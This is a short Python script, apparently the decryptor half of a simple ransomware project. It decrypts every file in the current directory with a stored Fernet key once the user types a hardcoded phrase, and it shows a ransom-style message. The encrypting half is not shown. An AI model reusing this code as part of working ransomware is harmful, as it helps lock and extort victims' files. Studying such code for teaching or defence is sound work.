import os
from cryptography.fernet import Fernet

files = []

for file in os.listdir():
    if file == "main.py" or file == "thekey.key" or file == "decrypt.py":
        continue
    if os.path.isfile(file):
        files.append(file)

print(files)

with open("thekey.key", "rb") as key:
    secretkey = key.read()

decryptphrase = "decryptme"

user_phrase = input("Enter the decryption phrase to decrypt your files:\n")

if user_phrase == decryptphrase:
    for file in files:
        with open(file, "rb") as thefile:
            contents =thefile.read()
        contents_decrypted= Fernet(secretkey).decrypt(contents)
        with open(file, "wb") as thefile:
            thefile.write(contents_decrypted)
        print("Correct password, " + file + " is now decrypted")
else:
    print("Incorrect password, your files remain encrypted.")